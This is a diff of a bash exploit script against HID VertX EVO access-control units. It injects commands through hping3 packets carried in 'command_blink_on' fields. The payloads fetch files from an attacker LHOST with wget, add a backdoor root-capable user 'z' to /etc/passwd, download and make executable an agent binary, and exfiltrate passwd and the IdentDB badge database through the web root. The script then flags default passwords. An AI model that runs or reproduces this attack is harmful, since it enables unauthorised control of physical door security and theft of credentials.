@@ -25,26 +25,25 @@
 #                                                                         #
 ###########################################################################
 
-# Deciding what we need to do here
-echo "[+] Would you like to exploit a new VertX EVO or cleanup a previously exploited controller?"
-echo -n "[+] exploit or cleanup: "
-read -e JOB
-if [ $JOB != "exploit" ] || [ $JOB != "cleanup" ]
+EXPECTED_ARGS=1;
+if [ $# -ne $EXPECTED_ARGS ]
 then
-  # Response required is verbatim "exploit" or "cleanup"
-  echo "[!] Nope. Please respond exactly as provided."
-  echo -n "[+] exploit or cleanup: "
-  read -e JOB
-  if [ $JOB != "exploit" ] || [ $JOB != "cleanup" ]
-  then
-    # Seriously type either "exploit" to exploit or "cleanup" to clean up.
-    echo '[!] Still Nope. '$JOB' is not "exploit" or "cleanup"!'
-    echo '[!] Please try again later.'
-    exit 1
-  fi
+  echo "Usage: ./eh400.sh <action>"
+  echo "Actions: exploit, cleanup"
+  echo "Example: ./eh400.sh exploit"
+  exit 1
 fi
 
-if [ $JOB == exploit ]
+CMDEXEC=`which hping3`
+
+if [ "$1" != "exploit" ] && [ "$1" != "cleanup" ]
+then
+  # Response required is verbatim "exploit" or "cleanup"
+  echo "[*] Action '$1' not recognized. Exiting..."
+  exit 0
+fi
+
+if [ "$1" == "exploit" ]
 then
   echo "[*] Fresh Exploit. Let's get started."
   # Set the follwoing 4 variables
@@ -53,23 +52,25 @@ then
   read -e TARGET
   echo -n "Target MAC: "
   read -e TMAC
-  echo -n "LHOST IP"
+  echo -n "LHOST IP: "
   read -e LHOST
 
-  #Finding hping3
-  CMDEXEC=`which hping3`
-  
   #Creating data files
   echo "[*] Creating Data files"
-  mkdir ./datafiles
-  cd ./datafiles
+  if [ "$(ls | egrep -q datafiles && echo "1" || echo "0")" = "0" ]
+  then
+    mkdir datafiles
+    cd ./datafiles
+  else
+    cd ./datafiles
+  fi
   echo 'command_blink_on;044;'${TMAC}';1`wget -O /tmp/z http://'${LHOST}/z'`;' > data1.txt
   echo 'command_blink_on;044;'${TMAC}';1`cat /tmp/z >> /etc/passwd`;' > data2.txt
   echo 'command_blink_on;044;'${TMAC}';1`wget -O /tmp/agent http://'${LHOST}'/a`;' > data3.txt
   echo 'command_blink_on;044;'${TMAC}';1`chmod +x /tmp/agent`;' > data4.txt
   echo 'command_blink_on;044;'${TMAC}';1`cp /etc/passwd /mnt/apps/web/`;' > data5.txt
-  echo 'command_blink_on;044;'${TMAC}';1`ln -s /mnt/apps/data/config/IdentDB /idb`;' > data6.txt
-  echo 'command_blink_on;044;'${TMAC}';1`cp /idb /mnt/apps/web/`;' > data7.txt
+  echo 'command_blink_on;044;'${TMAC}';1`ln -s /mnt/data/config/IdentDB /tmp/idb`;' > data6.txt
+  echo 'command_blink_on;044;'${TMAC}';1`cp /tmp/idb /mnt/apps/web/`;' > data7.txt
   echo 'z:$1$$.hpbaOY9sKSvVyW6rVvh8.:503:500:Linux User,,,:/home/z:/bin/sh' > /var/www/html/z
   cp ../tools/agent /var/www/html/a
   echo "[*] Data files created"
@@ -108,25 +109,31 @@ then
   echo ""
   cd ../
   echo "[*] Command Injections Complete."
-
+  
   #Exfiltraiting sensitive files
   #TODO: Impliment error checking on file exfil
+  echo "[*] Pausing 10 seconds to allow Vertx time to process"
+  sleep 10
   echo "[*] Exfiltrating passwd file and IdentDB."
   wget --user=z --password=backdoor -O idb http://${TARGET}/idb 
   wget --user=z --password=backdoor -O passwd http://${TARGET}/passwd
 
   echo "[*] Checking shadow for default passwords"
-  if [ $(egrep -q xRH0tNmOG1 passwd) = 1 ]
+  if [ "$(egrep -q xRH0tNmOG1 passwd && echo "1" || echo "0")" == "1" ]
   then
-    echo "[!] Default root:pass user/pass combo found."
+    echo -e "\e[1;31m[!]\e[0m Default root:pass user/pass combo found."
   fi
-  if [ $(egrep -q MPUVM6G7uu passwd) = 1 ]
+  if [ "$(egrep -q MPUVM6G7uu passwd && echo "1" || echo "0")" = "1" ]
   then
-    echo "[!] Default modem1:modem1 user/pass combo found."
+    echo -e "\e[1;31m[!]\e[0m Default modem1:modem1 user/pass combo found."
   fi
-  if [ $(egrep -q VFVf68vUI0 passwd) = 1 ]
+  if [ "$(egrep -q VFVf68vUI0 passwd && echo "1" || echo "0")" = "1" ]
   then
-    echo "[!] Default router1:router1 user/pass combo found."
+    echo -e "\e[1;31m[!]\e[0m Default router1:router1 user/pass combo found."
+  fi
+  if [ "$(egrep -q '(xRH0tNmOG1|MPUVM6G7uu|VFVf68vUI0)' passwd && echo "1" || echo "0")" = "0" ]
+  then
+    echo "[*] No default user/pass combinations identified."
   fi
   echo "[*] Exploitation Complete."
   echo "[*] Login at https://${TARGET}/ with z:backdoor for manual control over the VertX EVO."
@@ -135,7 +142,7 @@ then
  fi
 
 #Cleaning up post exploitation.
-if [ $JOB == cleanup ]
+if [ "$1" == "cleanup" ]
 then
   echo "[*] Cleaning up previous exploitation."
   echo "[*] Setting Variables..."
@@ -146,7 +153,7 @@ then
 
   #Creating Data Files
   echo "[*] Creating Data files."
-  if [ $(ls | egrep -q datafiles) = 0 ]
+  if [ "$(ls | egrep -q datafiles && echo "1" || echo "0")" = "0" ]
   then
     mkdir datafiles
     cd ./datafiles
@@ -155,7 +162,7 @@ then
   fi
   echo 'command_blink_on;044;'${TMAC}';1`deluser z`;' > data8.txt
   echo 'command_blink_on;044;'${TMAC}';1`rm /tmp/z`;' > data9.txt
-  echo 'command_blink_on;044;'${TMAC}';1`rm /idb /mnt/apps/web/idb`;' > data10.txt
+  echo 'command_blink_on;044;'${TMAC}';1`rm /tmp/idb /mnt/apps/web/idb`;' > data10.txt
   echo 'command_blink_on;044;'${TMAC}';1`rm /mnt/apps/web/passwd`;' > data11.txt
   echo 'command_blink_on;044;'${TMAC}';1`rm /tmp/agent`;' > data12.txt  
   #Executing
@@ -180,7 +187,7 @@ then
   ${CMDEXEC} -2 -p 4070 -c 1 -E data12.txt -d 150 ${TARGET} 2> /dev/null
   echo ""
   cd ../
-  echo "Cleanup Complete."
+  echo "[*] Cleanup Complete."
   exit 1
 fi
 exit 1
